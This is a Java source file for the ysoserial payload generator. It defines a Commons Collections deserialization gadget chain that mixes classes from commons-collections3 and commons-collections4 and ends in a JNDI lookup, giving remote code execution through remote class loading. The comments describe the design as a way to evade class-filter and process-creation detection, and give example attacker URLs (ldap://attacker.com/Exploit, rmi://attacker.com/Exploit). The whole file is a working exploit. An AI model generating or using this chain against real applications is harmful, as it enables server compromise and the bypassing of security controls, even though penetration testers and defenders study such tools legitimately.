package ysoserial.payloads;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

// CC4 TiedMapEntry (cross-library)
import org.apache.commons.collections4.keyvalue.TiedMapEntry;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Cross-library CC chain with JNDI sink.
	Discovered by automated fuzzer (web-fuzzer cross_splice, 2026-03-14).

	Gadget chain:
		ObjectInputStream.readObject()
			HashSet.readObject()
				HashMap.put()
					HashMap.hash()
						CC4.TiedMapEntry.hashCode()                 [commons-collections4]
							CC4.TiedMapEntry.getValue()
								CC3.LazyMap.get()                   [commons-collections3]
									ChainedTransformer.transform()
										ConstantTransformer -> InitialContext.class
										InvokerTransformer -> InitialContext.doLookup(jndiUrl)

	Combines two evasion techniques:
		1. Cross-library: CC4 TiedMapEntry + CC3 LazyMap
		   - CC3-only filters miss CC4.TiedMapEntry
		   - CC4-only filters miss CC3.LazyMap/ChainedTransformer
		2. JNDI sink instead of Runtime.exec
		   - Avoids behavioral detection targeting process creation
		   - doLookup() is a static method (no instance needed)
		   - Leads to RCE via remote class loading

	vs CommonsCollectionsJndi:
		- CCJndi uses CC3.TiedMapEntry (single library)
		- CCJndi2 uses CC4.TiedMapEntry (cross-library bridge)
		- CCJndi2 evades version-specific class filters

	Usage: payload arg is JNDI URL, e.g.:
		ldap://attacker.com/Exploit
		rmi://attacker.com/Exploit

	Requires:
		commons-collections 3.x (LazyMap, ChainedTransformer, InvokerTransformer)
		commons-collections4 4.x (TiedMapEntry)
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({
	"commons-collections:commons-collections:3.1",
	"org.apache.commons:commons-collections4:4.0"
})
@Authors({ Authors.DMBS335 })
public class CommonsCollectionsJndi2 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String jndiUrl) throws Exception {

		// Inert during setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// Real chain: InitialContext.doLookup(jndiUrl)
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(javax.naming.InitialContext.class),
			new InvokerTransformer("getDeclaredMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"doLookup", new Class[] { String.class } }),
			new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[] { jndiUrl } }),
			new ConstantTransformer(1) };

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		// CC4 TiedMapEntry wrapping CC3 LazyMap — cross-library bridge
		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		HashSet map = new HashSet(1);
		map.add("foo");

		Field f = null;
		try {
			f = HashSet.class.getDeclaredField("map");
		} catch (NoSuchFieldException e) {
			f = HashSet.class.getDeclaredField("backingMap");
		}
		Reflections.setAccessible(f);
		HashMap innimpl = (HashMap) f.get(map);

		Field f2 = null;
		try {
			f2 = HashMap.class.getDeclaredField("table");
		} catch (NoSuchFieldException e) {
			f2 = HashMap.class.getDeclaredField("elementData");
		}
		Reflections.setAccessible(f2);
		Object[] array = (Object[]) f2.get(innimpl);

		Object node = array[0];
		if (node == null) node = array[1];

		Field keyField = null;
		try {
			keyField = node.getClass().getDeclaredField("key");
		} catch (Exception e) {
			keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
		}
		Reflections.setAccessible(keyField);
		keyField.set(node, entry);

		// Arm the transformer chain
		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return map;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollectionsJndi2.class, args);
	}
}
